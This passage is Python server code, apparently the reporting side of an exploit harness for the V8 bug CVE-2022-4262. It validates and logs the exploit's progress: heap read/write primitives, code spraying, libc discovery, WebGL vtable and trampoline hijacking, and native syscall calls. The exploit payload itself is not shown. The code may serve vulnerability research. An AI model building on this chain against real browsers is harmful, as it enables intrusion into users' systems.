                    "native_wasm_target_valid",
                    "native_any_word_found", "native_probe_attempted",
                    "native_spray_landed", "native_spray_offset",
                    "native_spray_word_hits",
                    "native_jump_attempted", "native_jump_result_is_number",
                    "native_jump_result",
                    "native_direct_attempted", "native_direct_getpid_valid",
                    "native_direct_call_target_valid",
                    "native_direct_result_is_number", "native_direct_result",
                    "code_writable_probe_attempted", "code_writable",
                    "libc_base_probe_attempted", "isolate_root_valid",
                    "libc_graph_depth",
                    "libc_builtin_run_len", "libc_builtin_run_offset",
                    "libc_raw_field_bits",
                    "libc_elf_magic_found", "libc_elf_pages_back",
                    "libc_second_run_len", "libc_second_run_offset",
                    "libc_extref_init_off", "libc_extref_table_off",
                    "libc_extref_printf_thumb", "libc_extref_printf_valid",
                    "env_probe_attempted", "env_probe_getuid_valid",
                    "env_probe_open_valid", "env_probe_read_valid",
                    "env_probe_close_valid", "env_probe_call_target_valid",
                    "env_probe_getuid_result", "env_probe_open_fd",
                    "env_probe_read_count", "env_probe_close_result",
                    "env_probe_version", "env_probe_uname_valid",
                    "env_probe_uname_result", "env_probe_open_errno",
                    "env_probe_getuid_arg_result", "env_probe_abs_result",
                    "env_probe_backing_rt_kind", "env_probe_backing_rt_match",
                    "env_probe_backing_signed",
                    "webgl_graph_attempted", "webgl_ctx_created",
                    "webgl_native_resolved", "webgl_native_candidates",
                    "webgl_db_valid", "webgl_db_offset",
                    "webgl_gl_valid", "webgl_prov_valid",
                    "webgl_gl_prov_distinct",
                    "webgl_vtable_attempted", "webgl_vtable_entry_valid",
                    "webgl_vtable_result_is_number", "webgl_vtable_match",
                    "webgl_trigger_attempted", "webgl_trigger_buffer_resolved",
                    "webgl_trigger_memstart_valid",
                    "webgl_trigger_sii_resolved", "webgl_trigger_calls_completed",
                    "webgl_trigger_texture_id", "webgl_trigger_discard_done",
                    "webgl_trigger_tramp_found", "webgl_trigger_tramp_word_hits",
                    "webgl_trigger_spray_offset",
                    "webgl_trigger_targets_ptr_valid", "webgl_trigger_target0_match",
                    "ci_getpid_result", "ci_abs_result", "ci_mprotect_result",
                    "ci_mmap_rw_ok", "ci_errno_resolved", "ci_mmap_rw_errno",
                    "ci_mmap_rw_ret_fail", "ci_mmap_rwx_ret_fail", "ci_errno_ret_class",
                    "ci_i64_valid", "ci_ref_slot_valid", "ci_ref_overwrite_ok",
                    "ci_ref_slot_offset", "ci_mmap_big_ret_fail", "ci_mmap_big_errno",
                    "ci_syscall_getpid_result", "ci_syscall_getpid_valid", "ci_mmap_rwx_class",
                    "webgl_trigger_tramp_code_valid", "webgl_trigger_tramp_direct_write",
                    "webgl_trigger_printf_valid", "webgl_trigger_mprotect_ok",
                    "webgl_trigger_mprotect_result", "webgl_trigger_mprotect_errno",
                    "webgl_trigger_mmap_ok", "webgl_trigger_mmap_errno",
                    "wasm_direct_result", "wasm_import_result",
                    "webgl_trigger_tramp_written",
                }
                and type(report.get("status")) is str
                and report.get("status") in {
                    "primitive_candidate", "not_confirmed", "trigger_not_observed", "exception",
                }
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "primitive", "address_nonzero", "recovered_object",
                        "same_object", "trigger_observed", "rw_roundtrip_attempted",
                        "rw_roundtrip_match", "pointer_model_probe_attempted",
                        "arraybuffer_layout_32", "arraybuffer_layout_64",
                        "backing_store_nonzero", "backing_store_upper32_nonzero",
                        "backing_store_rw_probe_attempted", "backing_store_rw_read_match",
                        "backing_store_rw_write_match", "backing_store_rw_restore_match",
                    )
                )
                and type(report.get("pointer_model_hint")) is str
                and report["pointer_model_hint"] in {
                    "not_run", "32-bit-layout", "64-bit-layout", "ambiguous", "unresolved",
                }
                and (
                    report["pointer_model_hint"] != "not_run"
                    or not report["pointer_model_probe_attempted"]
                )
                and (
                    not report["pointer_model_probe_attempted"]
                    or report["pointer_model_hint"] != "not_run"
                )
                and (
                    report["pointer_model_hint"] != "32-bit-layout"
                    or (
                        report["arraybuffer_layout_32"]
                        and not report["arraybuffer_layout_64"]
                        and report["backing_store_nonzero"]
                    )
                )
                and (
                    report["pointer_model_hint"] != "64-bit-layout"
                    or (
                        report["arraybuffer_layout_64"]
                        and not report["arraybuffer_layout_32"]
                        and report["backing_store_nonzero"]
                    )
                )
                and (
                    not report["backing_store_upper32_nonzero"]
                    or report["arraybuffer_layout_64"]
                )
                and (
                    not report["backing_store_rw_probe_attempted"]
                    or (
                        report["pointer_model_probe_attempted"]
                        and report["pointer_model_hint"] == "32-bit-layout"
                        and report["backing_store_nonzero"]
                    )
                )
                and (
                    not report["backing_store_rw_read_match"]
                    or report["backing_store_rw_probe_attempted"]
                )
                and (
                    not report["backing_store_rw_write_match"]
                    or report["backing_store_rw_read_match"]
                )
                and (
                    not report["backing_store_rw_restore_match"]
                    or report["backing_store_rw_probe_attempted"]
                )
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "layout_probe_attempted", "jsfunc_code_pointer_valid",
                        "jsfunc_code_map_pointer_valid", "jsfunc_code_region_far",
                        "wasm_code_pointer_valid", "wasm_code_map_pointer_valid",
                        "wasm_code_region_far",
                    )
                )
                and (
                    report["layout_probe_attempted"]
                    or not any(
                        report[key]
                        for key in (
                            "jsfunc_code_pointer_valid", "jsfunc_code_map_pointer_valid",
                            "jsfunc_code_region_far", "wasm_code_pointer_valid",
                            "wasm_code_map_pointer_valid", "wasm_code_region_far",
                        )
                    )
                )
                and (
                    not report["jsfunc_code_map_pointer_valid"]
                    or report["jsfunc_code_pointer_valid"]
                )
                and (
                    not report["wasm_code_map_pointer_valid"]
                    or report["wasm_code_pointer_valid"]
                )
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "native_spray_ready", "native_code_pointer_valid",
                        "native_wasm_target_valid",
                        "native_any_word_found", "native_probe_attempted",
                        "native_spray_landed", "native_jump_attempted",
                        "native_jump_result_is_number",
                        "native_direct_attempted", "native_direct_getpid_valid",
                        "native_direct_call_target_valid",
                        "native_direct_result_is_number",
                    )
                )
                and (report["native_spray_ready"] or not report["native_probe_attempted"])
                and type(report.get("native_spray_offset")) is int
                and 0 <= report["native_spray_offset"] <= 0x800
                and type(report.get("native_spray_word_hits")) is int
                and 0 <= report["native_spray_word_hits"] <= 5
                and type(report.get("native_jump_result")) is int
                and 0 <= report["native_jump_result"] <= (2**31 - 1)
                and (
                    report["native_probe_attempted"]
                    or (
                        not report["native_spray_landed"]
                        and not report["native_jump_attempted"]
                        and not report["native_jump_result_is_number"]
                        and report["native_spray_offset"] == 0
                        and report["native_spray_word_hits"] == 0
                        and not report["native_wasm_target_valid"]
                        and report["native_jump_result"] == 0
                    )
                )
                and (
                    not report["native_spray_landed"]
                    or report["native_spray_offset"] > 0
                )
                and (
                    not report["native_jump_attempted"]
                    or report["native_spray_landed"]
                )
                and (
                    not report["native_jump_result_is_number"]
                    or (
                        report["native_jump_attempted"]
                        and report["native_jump_result"] > 0
                    )
                )
                and type(report.get("native_direct_result")) is int
                and 0 <= report["native_direct_result"] <= (2**31 - 1)
                and (
                    report["native_direct_attempted"]
                    or (
                        not report["native_direct_getpid_valid"]
                        and not report["native_direct_call_target_valid"]
                        and not report["native_direct_result_is_number"]
                        and report["native_direct_result"] == 0
                    )
                )
                and (
                    not report["native_direct_result_is_number"]
                    or (
                        report["native_direct_attempted"]
                        and report["native_direct_result"] > 0
                    )
                )
                and (
                    not self.server.native_getpid_direct_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["native_direct_attempted"]
                    or not report["libc_extref_printf_valid"]
                    or report["libc_extref_table_off"] == 0
                )
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "env_probe_attempted", "env_probe_getuid_valid",
                        "env_probe_open_valid", "env_probe_read_valid",
                        "env_probe_close_valid", "env_probe_call_target_valid",
                        "env_probe_uname_valid", "env_probe_backing_rt_match",
                        "env_probe_backing_signed",
                    )
                )
                and type(report.get("env_probe_getuid_result")) is int
                and -1 <= report["env_probe_getuid_result"] <= (2**31 - 1)
                and type(report.get("env_probe_open_fd")) is int
                and -1 <= report["env_probe_open_fd"] <= (2**31 - 1)
                and type(report.get("env_probe_read_count")) is int
                and -1 <= report["env_probe_read_count"] <= 255
                and type(report.get("env_probe_close_result")) is int
                and -1 <= report["env_probe_close_result"] <= (2**31 - 1)
                and type(report.get("env_probe_uname_result")) is int
                and -1 <= report["env_probe_uname_result"] <= (2**31 - 1)
                and type(report.get("env_probe_open_errno")) is int
                and -1 <= report["env_probe_open_errno"] <= 4095
                and type(report.get("env_probe_getuid_arg_result")) is int
                and -1 <= report["env_probe_getuid_arg_result"] <= (2**31 - 1)
                and type(report.get("env_probe_abs_result")) is int
                and -1 <= report["env_probe_abs_result"] <= (2**31 - 1)
                and type(report.get("env_probe_backing_rt_kind")) is int
                and 0 <= report["env_probe_backing_rt_kind"] <= 3
                and type(report.get("env_probe_version")) is str
                and len(report["env_probe_version"]) <= 255
                and all(
                    type(report.get(key)) is bool
                    for key in (
                        "webgl_graph_attempted", "webgl_ctx_created",
                        "webgl_native_resolved", "webgl_db_valid",
                        "webgl_gl_valid", "webgl_prov_valid",
                        "webgl_gl_prov_distinct",
                        "webgl_vtable_attempted", "webgl_vtable_entry_valid",
                        "webgl_vtable_result_is_number", "webgl_vtable_match",
                        "webgl_trigger_attempted", "webgl_trigger_buffer_resolved",
                        "webgl_trigger_memstart_valid",
                        "webgl_trigger_sii_resolved", "webgl_trigger_discard_done",
                        "webgl_trigger_tramp_found", "webgl_trigger_tramp_code_valid",
                        "webgl_trigger_tramp_direct_write", "webgl_trigger_printf_valid",
                        "webgl_trigger_mprotect_ok", "webgl_trigger_mmap_ok",
                        "webgl_trigger_targets_ptr_valid", "webgl_trigger_target0_match",
                        "ci_mmap_rw_ok", "ci_errno_resolved",
                        "ci_mmap_rw_ret_fail", "ci_mmap_rwx_ret_fail",
                        "ci_i64_valid", "ci_ref_slot_valid", "ci_ref_overwrite_ok",
                        "ci_mmap_big_ret_fail",
                        "ci_syscall_getpid_valid",
                        "webgl_trigger_tramp_written",
                    )
                )
                and type(report.get("webgl_native_candidates")) is int
                and 0 <= report["webgl_native_candidates"] <= 64
                and type(report.get("webgl_db_offset")) is int
                and -1 <= report["webgl_db_offset"] <= 92
                and type(report.get("webgl_trigger_calls_completed")) is int
                and 0 <= report["webgl_trigger_calls_completed"] <= 11
                and type(report.get("webgl_trigger_texture_id")) is int
                and -1 <= report["webgl_trigger_texture_id"] <= (2**32 - 1)
                and type(report.get("webgl_trigger_tramp_word_hits")) is int
                and 0 <= report["webgl_trigger_tramp_word_hits"] <= 20
                and type(report.get("webgl_trigger_spray_offset")) is int
                and -0x10000 <= report["webgl_trigger_spray_offset"] <= 0x10000
                and type(report.get("ci_getpid_result")) is int
                and -1 <= report["ci_getpid_result"] <= 0x7FFFFFFF
                and type(report.get("ci_abs_result")) is int
                and -0x80000000 <= report["ci_abs_result"] <= 0x7FFFFFFF
                and type(report.get("ci_mprotect_result")) is int
                and -1 <= report["ci_mprotect_result"] <= 0x7FFFFFFF
                and type(report.get("ci_mmap_rw_errno")) is int
                and -1 <= report["ci_mmap_rw_errno"] <= 4095
                and type(report.get("ci_errno_ret_class")) is int
                and 0 <= report["ci_errno_ret_class"] <= 5
                and type(report.get("ci_ref_slot_offset")) is int
                and 0 <= report["ci_ref_slot_offset"] <= 0x2c
                and type(report.get("ci_mmap_big_errno")) is int
                and -1 <= report["ci_mmap_big_errno"] <= 4095
                and type(report.get("ci_syscall_getpid_result")) is int
                and -1 <= report["ci_syscall_getpid_result"] <= 0x7FFFFFFF
                and type(report.get("ci_mmap_rwx_class")) is int
                and 0 <= report["ci_mmap_rwx_class"] <= 4
                and type(report.get("webgl_trigger_mprotect_result")) is int
                and -1 <= report["webgl_trigger_mprotect_result"] <= 0
                and type(report.get("webgl_trigger_mprotect_errno")) is int
                and -1 <= report["webgl_trigger_mprotect_errno"] <= 4095
                and type(report.get("webgl_trigger_mmap_errno")) is int
                and -1 <= report["webgl_trigger_mmap_errno"] <= 4095
                and type(report.get("wasm_direct_result")) is int
                and -0x80000000 <= report["wasm_direct_result"] <= 0x7FFFFFFF
                and type(report.get("wasm_import_result")) is int
                and -0x80000000 <= report["wasm_import_result"] <= 0x7FFFFFFF
                and (
                    (report["webgl_db_offset"] >= 0) == report["webgl_db_valid"]
                )
                and (report["webgl_native_resolved"] or not report["webgl_db_valid"])
                and (report["webgl_ctx_created"] or not report["webgl_native_resolved"])
                and (
                    (not report["webgl_vtable_match"])
                    or report["webgl_vtable_result_is_number"]
                )
                and (
                    (not report["webgl_vtable_result_is_number"])
                    or report["webgl_vtable_entry_valid"]
                )
                and (
                    (not report["webgl_vtable_entry_valid"])
                    or report["webgl_vtable_attempted"]
                )
                and (
                    (not report["webgl_trigger_discard_done"])
                    or report["webgl_trigger_calls_completed"] == 11
                )
                and (
                    report["webgl_trigger_calls_completed"] <= 1
                    or report["webgl_trigger_sii_resolved"]
                )
                and (
                    (not report["webgl_trigger_sii_resolved"])
                    or report["webgl_trigger_buffer_resolved"]
                )
                and (
                    (not report["webgl_trigger_tramp_found"])
                    or report["webgl_trigger_tramp_word_hits"] == 20
                )
                and (
                    report["webgl_trigger_tramp_word_hits"] == 0
                    or report["webgl_trigger_tramp_written"]
                )
                and (
                    (not report["webgl_trigger_tramp_written"])
                    or report["webgl_trigger_mmap_ok"]
                )
                and (
                    report["webgl_trigger_mprotect_ok"]
                    == (report["webgl_trigger_mprotect_result"] == 0)
                )
                and (
                    report["webgl_trigger_mprotect_errno"] == -1
                    or report["webgl_trigger_mprotect_result"] == -1
                )
                and (
                    report["webgl_trigger_mmap_errno"] == -1
                    or not report["webgl_trigger_mmap_ok"]
                )
                and (
                    (not report["webgl_trigger_tramp_direct_write"])
                    or report["webgl_trigger_tramp_found"]
                )
                and (
                    report["env_probe_attempted"]
                    or (
                        not report["env_probe_getuid_valid"]
                        and not report["env_probe_open_valid"]
                        and not report["env_probe_read_valid"]
                        and not report["env_probe_close_valid"]
                        and not report["env_probe_call_target_valid"]
                        and not report["env_probe_uname_valid"]
                        and report["env_probe_getuid_result"] == -1
                        and report["env_probe_open_fd"] == -1
                        and report["env_probe_read_count"] == -1
                        and report["env_probe_close_result"] == -1
                        and report["env_probe_uname_result"] == -1
                        and report["env_probe_open_errno"] == -1
                        and report["env_probe_getuid_arg_result"] == -1
                        and report["env_probe_abs_result"] == -1
                        and report["env_probe_backing_rt_kind"] == 0
                        and not report["env_probe_backing_rt_match"]
                        and not report["env_probe_backing_signed"]
                        and report["env_probe_version"] == ""
                    )
                )
                and (
                    not report["env_probe_version"]
                    or (
                        report["env_probe_attempted"]
                        and (
                            report["env_probe_uname_result"] == 0
                            or report["env_probe_read_count"] > 0
                        )
                    )
                )
                and (
                    not self.server.native_env_probe_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["env_probe_attempted"]
                    or not report["libc_extref_printf_valid"]
                    or report["libc_extref_table_off"] == 0
                )
                and (
                    not self.server.native_getpid_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["native_probe_attempted"]
                    or not report["native_spray_ready"]
                )
                and all(
                    type(report.get(key)) is bool
                    for key in ("code_writable_probe_attempted", "code_writable")
                )
                and (report["code_writable_probe_attempted"] or not report["code_writable"])
                and all(
                    type(report.get(key)) is bool
                    for key in ("libc_base_probe_attempted", "isolate_root_valid")
                )
                and type(report.get("libc_builtin_run_len")) is int
                and 0 <= report["libc_builtin_run_len"] <= 0x2000
                and type(report.get("libc_builtin_run_offset")) is int
                and 0 <= report["libc_builtin_run_offset"] <= 0x8000
                and type(report.get("libc_graph_depth")) is int
                and 0 <= report["libc_graph_depth"] <= 7
                and type(report.get("libc_raw_field_bits")) is int
                and 0 <= report["libc_raw_field_bits"] <= 0xFFFFF
                and (
                    report["libc_graph_depth"] >= 4
                    or report["libc_raw_field_bits"] == 0
                )
                and (report["isolate_root_valid"] or report["libc_builtin_run_len"] == 0)
                and (report["isolate_root_valid"] or report["libc_builtin_run_offset"] == 0)
                and (report["isolate_root_valid"] == (report["libc_graph_depth"] == 7))
                and type(report.get("libc_elf_magic_found")) is bool
                and type(report.get("libc_elf_pages_back")) is int
                and 0 <= report["libc_elf_pages_back"] <= 1023
                and type(report.get("libc_second_run_len")) is int
                and 0 <= report["libc_second_run_len"] <= 0x2000
                and type(report.get("libc_second_run_offset")) is int
                and 0 <= report["libc_second_run_offset"] <= 0x8000
                and type(report.get("libc_extref_init_off")) is int
                and 0 <= report["libc_extref_init_off"] <= 0x8000
                and type(report.get("libc_extref_table_off")) is int
                and 0 <= report["libc_extref_table_off"] <= 0x8000
                and type(report.get("libc_extref_printf_thumb")) is bool
                and type(report.get("libc_extref_printf_valid")) is bool
                and (
                    report["libc_extref_init_off"] > 0
                    or report["libc_extref_table_off"] == 0
                )
                and (
                    report["libc_extref_table_off"] == 0
                    or report["libc_extref_init_off"] != 0
                )
                and (
                    report["libc_second_run_len"] <= report["libc_builtin_run_len"]
                )
                and (
                    report["libc_second_run_len"] > 0
                    or report["libc_second_run_offset"] == 0
                )
                and (
                    report["libc_elf_magic_found"]
                    or report["libc_elf_pages_back"] == 0
                )
                and (
                    report["isolate_root_valid"]
                    or not report["libc_elf_magic_found"]
                )
                and (
                    not self.server.libc_base_probe_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["libc_base_probe_attempted"]
                )
                and (
                    not self.server.code_writable_probe_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["code_writable_probe_attempted"]
                )
                and report["primitive"] == (report["status"] == "primitive_candidate")
                and (
                    report["array_length"] is None
                    or (
                        type(report["array_length"]) is int
                        and 0 <= report["array_length"] <= (2**32 - 1)
                    )
                )
                and (not report["trigger_observed"] or report["array_length"] == 0x30)
                and (report["array_length"] != 0x30 or report["trigger_observed"])
                and (not report["same_object"] or report["recovered_object"])
                and (not report["rw_roundtrip_match"] or report["rw_roundtrip_attempted"])
                and (
                    not self.server.rw_roundtrip_requested
                    or report["status"] == "exception"
                    or report["status"] == "trigger_not_observed"
                    or report["rw_roundtrip_attempted"]
                )
                and (
                    not self.server.pointer_model_probe_requested
                    or report["status"] == "exception"
                    or report["status"] == "trigger_not_observed"
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_probe_attempted"]
                )
                and (
                    not self.server.layout_probe_requested
                    or report["status"] in {"exception", "trigger_not_observed"}
                    or not report["rw_roundtrip_match"]
                    or report["pointer_model_hint"] != "32-bit-layout"
                    or report["layout_probe_attempted"]
                )
                and (
                    report["status"] not in {"primitive_candidate", "not_confirmed"}
                    or report["trigger_observed"]
                )
                and (
                    report["status"] != "trigger_not_observed"
                    or (
                        not report["trigger_observed"]
                        and report["array_length"] is not None
                        and report["array_length"] != 0x30
                        and not report["address_nonzero"]
                        and not report["recovered_object"]
                        and not report["same_object"]
                    )
                )
                and (
                    report["status"] != "primitive_candidate"
                    or (
                        report["address_nonzero"]
                        and report["recovered_object"]
                        and report["same_object"]
                    )
                )
                and type(report.get("pressure_allocation_attempts")) is int
                and 0 <= report["pressure_allocation_attempts"] <= self.server.pressure_max_attempts
                and type(report.get("pressure_allocation_failures")) is int
                and 0 <= report["pressure_allocation_failures"] <= report["pressure_allocation_attempts"]
                and report["pressure_allocation_attempts"] == (
                    report["pressure_allocation_failures"] + report["pressure_allocation_calls"]
                )
                and common_pressure_valid
            )
        if not valid:
            try:
                detail = json.dumps(report, sort_keys=True, default=str)
            except (TypeError, ValueError):
                detail = "<unserializable>"
            print(f"report_rejected reason=invalid report={detail}", flush=True)
            self.send_bytes(400, "text/plain; charset=utf-8", b"")
            return

        with self.server.report_lock:
            if not self.server.report_received:
                self.server.report_received = True
                if self.server.webgl_probe_mode:
                    print(
                        "webgl_probe_result "
                        f"webgl1_supported={str(report['webgl1_supported']).lower()} "
                        f"webgl2_supported={str(report['webgl2_supported']).lower()} "
                        f"webgl2_software_rendering={str(report['webgl2_software_rendering']).lower()} "
                        f"webgl2_version={json.dumps(report['webgl2_version'])} "
                        f"webgl2_renderer={json.dumps(report['webgl2_renderer'])} "
                        f"webgl2_vendor={json.dumps(report['webgl2_vendor'])} "
                        f"webgl2_unmasked_vendor={json.dumps(report['webgl2_unmasked_vendor'])} "
                        f"webgl2_unmasked_renderer={json.dumps(report['webgl2_unmasked_renderer'])} "
                        f"webgl2_discard_framebuffer={str(report['webgl2_discard_framebuffer']).lower()} "
                        f"webgl2_max_texture_size={report['webgl2_max_texture_size']} "
                        f"webgl2_error={json.dumps(report['webgl2_error'])}",
                        flush=True,
                    )
                elif self.server.calibration_mode:
                    print(
                        f"pressure_calibration_result={report['status']} "
                        f"weakref_target_cleared={str(report['weakref_target_cleared']).lower()} "
                        f"finalization_signal={str(report['finalization_signal']).lower()} "
                        f"finalization_callbacks={report['finalization_callbacks']} "
                        f"allocation_attempts={report['allocation_attempts']} "
                        f"allocation_failures={report['allocation_failures']} "
                        f"pressure_allocation_bytes={report['pressure_allocation_bytes']} "
                        f"pressure_allocation_calls={report['pressure_allocation_calls']} "
                        f"heap_used_start_bytes={report['heap_used_start_bytes']} "
                        f"heap_used_bytes={report['heap_used_bytes']} "
                        f"heap_limit_bytes={report['heap_limit_bytes']}",
                        flush=True,
                    )
                else:
                    print(
                        f"cve2022_4262_result={report['status']} "
                        f"heap_primitive_candidate={str(report['primitive']).lower()} "
                        f"address_nonzero={str(report['address_nonzero']).lower()} "
                        f"recovered_object={str(report['recovered_object']).lower()} "
                        f"same_object={str(report['same_object']).lower()} "
                        f"trigger_observed={str(report['trigger_observed']).lower()} "
                        f"rw_roundtrip_attempted={str(report['rw_roundtrip_attempted']).lower()} "
                        f"rw_roundtrip_match={str(report['rw_roundtrip_match']).lower()} "
                        f"pointer_model_probe_attempted={str(report['pointer_model_probe_attempted']).lower()} "
                        f"arraybuffer_layout_32={str(report['arraybuffer_layout_32']).lower()} "
                        f"arraybuffer_layout_64={str(report['arraybuffer_layout_64']).lower()} "
                        f"backing_store_nonzero={str(report['backing_store_nonzero']).lower()} "
                        f"backing_store_upper32_nonzero={str(report['backing_store_upper32_nonzero']).lower()} "
                        f"pointer_model_hint={report['pointer_model_hint']} "
                        f"backing_store_rw_probe_attempted={str(report['backing_store_rw_probe_attempted']).lower()} "
                        f"backing_store_rw_read_match={str(report['backing_store_rw_read_match']).lower()} "
                        f"backing_store_rw_write_match={str(report['backing_store_rw_write_match']).lower()} "
                        f"backing_store_rw_restore_match={str(report['backing_store_rw_restore_match']).lower()} "
                        f"layout_probe_attempted={str(report['layout_probe_attempted']).lower()} "
                        f"jsfunc_code_pointer_valid={str(report['jsfunc_code_pointer_valid']).lower()} "
                        f"jsfunc_code_map_pointer_valid={str(report['jsfunc_code_map_pointer_valid']).lower()} "
                        f"jsfunc_code_region_far={str(report['jsfunc_code_region_far']).lower()} "
                        f"wasm_code_pointer_valid={str(report['wasm_code_pointer_valid']).lower()} "
                        f"wasm_code_map_pointer_valid={str(report['wasm_code_map_pointer_valid']).lower()} "
                        f"wasm_code_region_far={str(report['wasm_code_region_far']).lower()} "
                        f"native_spray_ready={str(report['native_spray_ready']).lower()} "
                        f"native_code_pointer_valid={str(report['native_code_pointer_valid']).lower()} "
                        f"native_wasm_target_valid={str(report['native_wasm_target_valid']).lower()} "
                        f"native_any_word_found={str(report['native_any_word_found']).lower()} "
                        f"native_probe_attempted={str(report['native_probe_attempted']).lower()} "
                        f"native_spray_landed={str(report['native_spray_landed']).lower()} "
                        f"native_spray_offset={report['native_spray_offset']} "
                        f"native_spray_word_hits={report['native_spray_word_hits']} "
                        f"native_jump_attempted={str(report['native_jump_attempted']).lower()} "
                        f"native_jump_result_is_number={str(report['native_jump_result_is_number']).lower()} "
                        f"native_jump_result={report['native_jump_result']} "
                        f"native_direct_attempted={str(report['native_direct_attempted']).lower()} "
                        f"native_direct_getpid_valid={str(report['native_direct_getpid_valid']).lower()} "
                        f"native_direct_call_target_valid={str(report['native_direct_call_target_valid']).lower()} "
                        f"native_direct_result_is_number={str(report['native_direct_result_is_number']).lower()} "
                        f"native_direct_result={report['native_direct_result']} "
                        f"code_writable_probe_attempted={str(report['code_writable_probe_attempted']).lower()} "
                        f"code_writable={str(report['code_writable']).lower()} "
                        f"libc_base_probe_attempted={str(report['libc_base_probe_attempted']).lower()} "
                        f"isolate_root_valid={str(report['isolate_root_valid']).lower()} "
                        f"libc_graph_depth={report['libc_graph_depth']} "
                        f"libc_raw_field_bits=0x{report['libc_raw_field_bits']:05x} "
                        f"libc_builtin_run_len={report['libc_builtin_run_len']} "
                        f"libc_builtin_run_offset={report['libc_builtin_run_offset']} "
                        f"libc_elf_magic_found={str(report['libc_elf_magic_found']).lower()} "
                        f"libc_elf_pages_back={report['libc_elf_pages_back']} "
                        f"libc_second_run_len={report['libc_second_run_len']} "
                        f"libc_second_run_offset={report['libc_second_run_offset']} "
                        f"libc_extref_init_off={report['libc_extref_init_off']} "
                        f"libc_extref_table_off={report['libc_extref_table_off']} "
                        f"libc_extref_printf_thumb={str(report['libc_extref_printf_thumb']).lower()} "
                        f"libc_extref_printf_valid={str(report['libc_extref_printf_valid']).lower()} "
                        f"env_probe_attempted={str(report['env_probe_attempted']).lower()} "
                        f"env_probe_getuid_valid={str(report['env_probe_getuid_valid']).lower()} "
                        f"env_probe_open_valid={str(report['env_probe_open_valid']).lower()} "
                        f"env_probe_read_valid={str(report['env_probe_read_valid']).lower()} "
                        f"env_probe_close_valid={str(report['env_probe_close_valid']).lower()} "
                        f"env_probe_call_target_valid={str(report['env_probe_call_target_valid']).lower()} "
                        f"env_probe_getuid_result={report['env_probe_getuid_result']} "
                        f"env_probe_open_fd={report['env_probe_open_fd']} "
                        f"env_probe_read_count={report['env_probe_read_count']} "
                        f"env_probe_close_result={report['env_probe_close_result']} "
                        f"env_probe_version={json.dumps(report['env_probe_version'])} "
                        f"env_probe_uname_valid={str(report['env_probe_uname_valid']).lower()} "
                        f"env_probe_uname_result={report['env_probe_uname_result']} "
                        f"env_probe_open_errno={report['env_probe_open_errno']} "
                        f"env_probe_getuid_arg_result={report['env_probe_getuid_arg_result']} "
                        f"env_probe_abs_result={report['env_probe_abs_result']} "
                        f"env_probe_backing_rt_kind={report['env_probe_backing_rt_kind']} "
                        f"env_probe_backing_rt_match={str(report['env_probe_backing_rt_match']).lower()} "
                        f"env_probe_backing_signed={str(report['env_probe_backing_signed']).lower()} "
                        f"webgl_graph_attempted={str(report['webgl_graph_attempted']).lower()} "
                        f"webgl_ctx_created={str(report['webgl_ctx_created']).lower()} "
                        f"webgl_native_resolved={str(report['webgl_native_resolved']).lower()} "
                        f"webgl_native_candidates={report['webgl_native_candidates']} "
                        f"webgl_db_valid={str(report['webgl_db_valid']).lower()} "
                        f"webgl_db_offset={report['webgl_db_offset']} "
                        f"webgl_gl_valid={str(report['webgl_gl_valid']).lower()} "
                        f"webgl_prov_valid={str(report['webgl_prov_valid']).lower()} "
                        f"webgl_gl_prov_distinct={str(report['webgl_gl_prov_distinct']).lower()} "
                        f"webgl_vtable_attempted={str(report['webgl_vtable_attempted']).lower()} "
                        f"webgl_vtable_entry_valid={str(report['webgl_vtable_entry_valid']).lower()} "
                        f"webgl_vtable_result_is_number={str(report['webgl_vtable_result_is_number']).lower()} "
                        f"webgl_vtable_match={str(report['webgl_vtable_match']).lower()} "
                        f"webgl_trigger_attempted={str(report['webgl_trigger_attempted']).lower()} "
                        f"webgl_trigger_buffer_resolved={str(report['webgl_trigger_buffer_resolved']).lower()} "
                        f"webgl_trigger_memstart_valid={str(report['webgl_trigger_memstart_valid']).lower()} "
                        f"webgl_trigger_sii_resolved={str(report['webgl_trigger_sii_resolved']).lower()} "
                        f"webgl_trigger_calls_completed={report['webgl_trigger_calls_completed']} "
                        f"webgl_trigger_texture_id={report['webgl_trigger_texture_id']} "
                        f"webgl_trigger_discard_done={str(report['webgl_trigger_discard_done']).lower()} "
                        f"webgl_trigger_tramp_found={str(report['webgl_trigger_tramp_found']).lower()} "
                        f"webgl_trigger_tramp_word_hits={report['webgl_trigger_tramp_word_hits']} "
                        f"webgl_trigger_spray_offset={report['webgl_trigger_spray_offset']} "
                        f"webgl_trigger_targets_ptr_valid={str(report['webgl_trigger_targets_ptr_valid']).lower()} "
                        f"webgl_trigger_target0_match={str(report['webgl_trigger_target0_match']).lower()} "
                        f"ci_getpid_result={report['ci_getpid_result']} "
                        f"ci_abs_result={report['ci_abs_result']} "
                        f"ci_mprotect_result={report['ci_mprotect_result']} "
                        f"ci_mmap_rw_ok={str(report['ci_mmap_rw_ok']).lower()} "
                        f"ci_errno_resolved={str(report['ci_errno_resolved']).lower()} "
                        f"ci_errno_ret_class={report['ci_errno_ret_class']} "
                        f"ci_i64_valid={str(report['ci_i64_valid']).lower()} "
                        f"ci_ref_slot_valid={str(report['ci_ref_slot_valid']).lower()} "
                        f"ci_ref_overwrite_ok={str(report['ci_ref_overwrite_ok']).lower()} "
                        f"ci_ref_slot_offset={report['ci_ref_slot_offset']} "
                        f"ci_mmap_big_ret_fail={str(report['ci_mmap_big_ret_fail']).lower()} "
                        f"ci_mmap_big_errno={report['ci_mmap_big_errno']} "
                        f"ci_syscall_getpid_result={report['ci_syscall_getpid_result']} "
                        f"ci_syscall_getpid_valid={str(report['ci_syscall_getpid_valid']).lower()} "
